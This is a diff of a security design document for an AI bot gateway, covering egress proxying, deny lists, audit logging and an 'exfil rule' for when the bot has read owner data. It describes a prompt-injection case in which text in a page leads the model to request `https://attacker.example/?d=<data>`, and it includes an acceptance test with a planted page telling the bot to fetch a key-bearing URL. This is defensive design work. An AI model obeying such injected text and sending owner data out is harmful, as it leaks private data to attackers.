@@ -226,11 +226,18 @@ instructions, and the design does not rely on the model to tell the difference:
   conversation.
 - Grant-bearing tools (TinyCloud data, an owner's server) are still gated by their allowlist, scope, budget and
   expiry. Writes are not exposed in phase 1; a later write phase confirms each write with the owner outside the model.
-- The remaining risk is leaking data the bot legitimately read, through a URL or a search query. So once a task has read
-  owner data (any grant-bearing call), `web__fetch` in that task accepts only a URL the owner typed or one a search in
-  the same task returned, and a query longer than 200 characters is refused. This narrows the channel, it does not
-  close it: a URL path or a query string can still carry a few words. Whether to go further and turn web
-  access off for the rest of any task that has read owner data is decision 5 below.
+- **The exfil rule: the largest risk in phase 2, and one no proxy can remove.** Once Main can read owner data and also
+  fetch the open web or call an owner-added server, injected text in a page or a tool result can make it read data and
+  then request `https://attacker.example/?d=<data>`. A search query is the same channel. An allowlist cannot stop this
+  while fetch is open-ended. Phase 2 therefore ships with exactly one of these rules, chosen in decision 5:
+  - **(a) Strict.** In a task that has used owner data (any grant-bearing call), no open fetch and no owner-added server
+    calls. Recommended starting point.
+  - **(b) Narrowed.** Fetch only through a gateway-built search call whose query is shown to the owner or length-capped
+    (200 characters), plus URLs the owner typed or a search in the same task returned. This narrows the channel and does
+    not close it: a query or a path can still carry a few words.
+  - **(c) Owner confirms each new domain** (outside the model) before the first fetch to it in a task that has used
+    owner data. The first loosening to consider after (a).
+  The same rule covers owner-added servers: they are arbitrary hosts too.
 
 ## Owner-added MCP servers (phase 3)
 
@@ -313,11 +320,11 @@ argument conditions, and filters `tools/list` responses, including per SSE event
 | --- | --- | --- |
 | Default-deny egress | `allowlist` by domain glob or CIDR; unmatched gets 403 | Good for fixed destinations (model, TinyCloud MCP, search provider). For "fetch any public page" the allowlist has to be wide open, so the deny list does the work. |
 | Built-in DNS | Resolves every name to the proxy so traffic is steered through it | Not used in the sandbox (it has no network). The gateway would use the proxy's HTTP/CONNECT listener instead. Whether the DNS server can be switched off is unchecked. |
-| Upstream IP deny list | `upstream_deny_cidrs`, enforced in the dialer's `Control` hook after resolution, so a name that resolves (or rebinds) to a denied address is refused before the connect; IPv4-mapped IPv6 is unmapped first | Good, and it is the piece we would otherwise write ourselves. **The default list is only cloud metadata and loopback**; RFC 1918, CGNAT, link-local, ULA and multicast are not denied unless we list them. NAT64 forms need listing too. With an upstream proxy configured the check applies to the proxy's address, not the target. |
+| Upstream IP deny list | `upstream_deny_cidrs`, enforced in the dialer's `Control` hook after resolution (source: `internal/dnsguard`), so a name that resolves or rebinds to a denied address is refused before the connect; IPv4-mapped IPv6 is unmapped first | Good, and it is the piece we would otherwise write ourselves. **The default list is only cloud metadata and loopback.** For open fetch we list: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10` (CGNAT, which includes the operators' private overlay network), `169.254.0.0/16`, `0.0.0.0/8`, `fc00::/7`, `fe80::/10`, multicast, and the NAT64 range. The gateway does not follow redirects, or re-checks every hop through the proxy. With an upstream proxy configured the check applies to the proxy's address, not the target. |
 | Proxy tokens swapped for real secrets | `secrets` transform: the workload sends a token, the proxy replaces it from env, file, AWS, Vault or 1Password sources, `require: true` rejects requests without it | Fits static service keys (the model key, a search key). Does not fit per-owner, short-lived tokens: sources are static, and a changed value needs a config reload (`POST /v1/reload`) or a `grpc` transform we would write. The gateway keeps per-owner grants itself (section 2). |
-| Per-request audit | JSON per request with the transform trace, secrets swapped (names and locations, not values) and rejections | Good. Matches our counts-only rule if `body_capture` stays off and the log has no query or path of fetched pages we don't want (to confirm). It is per request, not per owner: it cannot know which bot made a call. |
-| SSE / streamable HTTP | SSE and WebSocket proxied natively; MCP policy filters SSE per event | Good for MCP and model streaming. An open issue says non-SSE streams (NDJSON, Connect, gRPC) are buffered until the stream ends; we do not use those. |
-| MCP pipeline | Per-server tool allowlist, `when` conditions on arguments, `tools/list` filtering, `mcp_gateway` routes with credential injection, audit of every JSON-RPC message | Useful for owner-added servers (argument conditions are stronger than our name-only list). v1 limits: Streamable HTTP only, resources and prompts are not enforced, a batch with one denied entry is rejected whole. Server entries are static YAML, so per-owner servers would mean per-owner config. |
+| Per-request audit | JSON per request with the transform trace, secrets swapped (names and locations, not values) and rejections. No headers or bodies, and no query string in a trial run | Mixed. **Paths are logged**, and for web fetch the path is the owner's task content, so raw lines are not shipped as they are: log host only or hash the path (a filter in front of the log, or a patch), and add rotation, since there is none. It is per request, not per owner: it cannot know which bot made a call. |
+| SSE / streamable HTTP | SSE is flushed per chunk, so MCP streamable HTTP over SSE works; WebSocket is HTTP/1 only | Good for MCP and model streaming. Non-SSE chunked responses (NDJSON, Connect, gRPC) are buffered until they end (an open issue, seen in a trial), and the 30 s response-header timeout needs raising for slow tool calls. |
+| MCP pipeline | README for v0.56.0: per-server tool allowlist, `when` conditions on arguments, `tools/list` filtering, `mcp_gateway` routes with credential injection, audit of every JSON-RPC message. An earlier trial found no JSON-RPC awareness, so treat this as newer and unproven here | Not relied on in phases 1 and 2: the gateway's own rebuild, tool list and namespacing stay the gateway's job. Possibly useful later for owner-added servers (argument conditions). v1 limits: Streamable HTTP only, resources and prompts not enforced, a batch with one denied entry is rejected whole, static per-server YAML. |
 
 ### What it would replace in `bots-gateway`
 
@@ -349,12 +356,20 @@ argument conditions, and filters `tools/list` responses, including per SSE event
 
 - A new `bots-egress` container beside `bots-gateway` in `docker-compose.phala.yml`: unprivileged, read-only, no
   capabilities, no published port. It sits on the `egress` network; the gateway moves to a network that reaches only
-  it (the existing `bots-internal` network already has `internal: true`).
-- Built from a pinned release tag by our own Dockerfile (module checksums from `go.sum`, binary checks against the
-  signed `checksums.txt`) and referenced by digest, as the other images are. The project's published images are not
-  signed (open issue), so we do not pull `latest` from the registry.
-- The CA private key is a deploy secret held by the proxy only; the gateway gets the certificate. Real static keys move
-  from the gateway's environment to the proxy's. Config is one YAML file in the image; a change is a redeploy.
+  it (the existing `bots-internal` network already has `internal: true`). The sandbox never reaches it.
+- **The tunnel has no authentication** (`Proxy-Authorization` is not checked and SOCKS5 is no-auth). Anything that can
+  reach its port can use it. So it listens only on a network that holds the gateway and the proxy and nothing else, is
+  never published, and no other service joins that network. On a shared host a local user could otherwise use it.
+- **Fail closed.** The gateway has no direct route, so if the proxy is down a fetch is refused, never sent direct.
+- Built from a pinned release tag by our own Dockerfile (module checksums from `go.sum`) and referenced by digest, as
+  the other images are. Release signing is thin: only v0.42.0 has a GPG-signed checksum file (it lacks the DNS switch);
+  later releases, including v0.56.0, carry `checksums.txt` only, and the published images are unsigned. We pin by tag,
+  digest and checksum, and review the diff of every upgrade; we do not pull `latest`.
+- **The MITM CA key can impersonate any site to anything that trusts it.** It is a deploy secret held by the proxy only
+  (key files mode 0600), and only the gateway trusts the CA; it is never put in the sandbox, the supervisor or any
+  other image. Real static keys (a search key) move from the gateway's environment to the proxy's, scoped to exact
+  HTTPS hosts (a secret can be swapped onto plain `http://`, an open issue). Per-owner tokens stay in the gateway.
+  Config is one YAML file in the image; a change is a redeploy.
 - The model leg stays direct from the gateway in phase 1. Putting it through the proxy adds a TLS-terminating hop for
   prompt traffic, and the gateway code shows no certificate pinning but we have not checked what the provider's
   verification relies on. Moving it is a separate decision after the spike.
@@ -365,13 +380,14 @@ argument conditions, and filters `tools/list` responses, including per SSE event
   contributors); the Go module path and release badges still say `ironsh`, and the maintainers publish an enterprise
   product (a managed control plane, dynamic Vault engines, a Kubernetes operator) beside it. We would use the open
   standalone mode only.
-- Pre-1.0: v0.56.0 (2026-11-04) after releases roughly every one to three weeks; the last commit we saw was 2026-11-04.
-  Expect config and behaviour changes between releases; we pin and review each bump, and do not auto-update.
+- Pre-1.0: v0.56.0 (2026-11-04) after releases roughly every one to three weeks, mostly from one dominant maintainer;
+  the last commit we saw was 2026-11-04. Expect config and behaviour changes between releases; we pin and review each
+  bump, and do not auto-update. It sits on every byte of egress, so a bad release is a bad day.
 - Open issues relevant to us (52 open in all): non-SSE streams buffered; request bodies over the buffer cap truncated
   when a transform reads the body (avoid `match_body`); secrets can be swapped over plain HTTP with no way to require
   TLS (scope secrets rules to exact HTTPS hosts); dependency advisories open on an earlier release (check the pinned
   one); unsigned images; denials return an empty 403 body.
-- It publishes a private vulnerability-reporting contact and signs its release checksums.
+- It publishes a private vulnerability-reporting contact.
 - Exit: the gateway talks to it through the standard proxy environment and a CA, and keeps its own guards, so replacing
   it with our own dial guard (or Squid or Envoy) loses the outer ring and nothing else.
 
@@ -393,6 +409,9 @@ Spike (1 to 2 days, on a throwaway CVM or locally):
 5. Added latency per call, and memory over a 24-hour run.
 6. Whether per-owner tokens can be handled by `file` plus reload or by a `grpc` transform without per-grant restarts; if
    not, they stay in the gateway as designed.
+7. With the proxy stopped, a fetch is refused and nothing goes direct; from any container but the gateway the tunnel
+   is unreachable.
+8. The log carries no fetched path or query in the form we ship, and the 30 s header timeout is raised and exercised.
 
 ## Build order
 
@@ -428,8 +447,10 @@ gateway only. Each phase ships behind the existing test-account flag and does no
    say so before build.
 4. **Search provider and its key** (a paid credential, so not added without an explicit decision): which of Tavily,
    Brave, Exa, Kagi or self-hosted SearXNG, and a dedicated key for the bots service.
-5. **After owner data is read in a task, should web access stop entirely** (strict), or only narrow to owner-typed and
-   search-returned URLs with a query length cap (this plan's default)?
+5. **The exfil rule for phase 2 (pick one).** In a task that has used owner data: (a) no open fetch and no owner-added
+   server calls (recommended start); (b) fetch only through a gateway-built search call with the query shown or capped
+   at 200 characters, plus owner-typed and search-returned URLs; or (c) the owner confirms each new domain. Without
+   one of these, phase 2 is an exfiltration path whatever the egress layer does. See Web access.
 6. **Web access has no expiry** (it carries no owner authority). Say so if it should expire like the data grants.
 7. **Egress layer.** Adopt iron-proxy as the gateway's outer ring from phase 2 after the spike (this plan's
    recommendation), or build the guard in the gateway only. Either way the gateway keeps its own checks.
@@ -447,7 +468,8 @@ On a flagged test account:
   file. `GET` and `DELETE` on `/v1/mcp` return 405 and no reply carries `Mcp-Session-Id`.
 - **Web:** a fetch of a public page returns text; `http://127.0.0.1`, `http://169.254.169.254`, a name that resolves to a
   private address, and a redirect to either are each refused and counted as `blocked_address`; a 2 MiB page is cut; a
-  PDF is `wrong_type`; the 21st fetch in a task is `budget`.
+  PDF is `wrong_type`; the 21st fetch in a task is `budget`. With a page that tells Main to read a key and fetch
+  `https://<test host>/?d=<value>`, the chosen exfil rule holds: the test host receives no request carrying the value.
 - **Owner-added server** (a local test server): the tool list shows; an unselected tool is refused; changing a tool's
   description withholds it; Remove ends the next call.
 - **Everywhere:** the sandbox's environment, filesystem and a captured request contain no token or key. Report a mock run
